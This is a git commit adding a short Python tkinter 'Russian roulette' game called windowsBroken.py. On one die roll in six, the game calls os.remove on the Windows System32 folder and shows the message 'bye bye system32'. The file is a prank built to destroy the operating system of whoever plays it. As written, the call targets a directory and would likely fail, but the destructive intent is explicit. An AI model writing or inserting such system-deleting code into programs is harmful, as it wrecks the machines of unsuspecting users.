4ae538aaf064c90563b7c6dd4372c5492f656488
K7 667 <k7.667.k7@gmail.com>
2023-12-27 17:07:34 +0100

    initial commit

---
+++ windowsBroken.py
@@ -0,0 +1,24 @@
+import tkinter as tk
+import random as rdm
+import os
+
+def game(): 
+    bang = rdm.randint(1, 6)
+    if bang == 6:
+        label.config(text="Lose.. bye bye system32")
+        os.remove('C:/Windows/System32')
+    else:
+        label.config(text="Win, retry :)")
+
+root = tk.Tk()
+root.title('Russian idiot game')
+
+playBtn = tk.Button(root, text="play", command=game)
+
+playBtn.pack(pady=20)
+
+label = tk.Label(root, text="")
+label.pack()
+
+root.mainloop()
+    
